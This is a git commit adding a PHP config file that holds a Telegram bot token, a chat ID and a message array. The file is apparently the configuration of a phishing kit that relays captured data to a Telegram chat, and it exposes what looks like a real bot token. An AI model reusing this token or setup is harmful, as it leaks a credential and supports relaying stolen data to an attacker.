42d25b1636eae883038758e72b9c10020e38c666
hamidlakhal <107665130+hamidlakhal@users.noreply.github.com>
2022-06-23 11:55:38 +0000

    m

---
+++ config.php
@@ -0,0 +1,12 @@
+<?php
+
+
+  //works only on shell don't test on localhost it will redirect you
+
+$token = "5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks"; //your bot token
+$data = [
+    'text' => $msg,
+    'chat_id' => '1289904248' //your chatID
+];
+
+?>
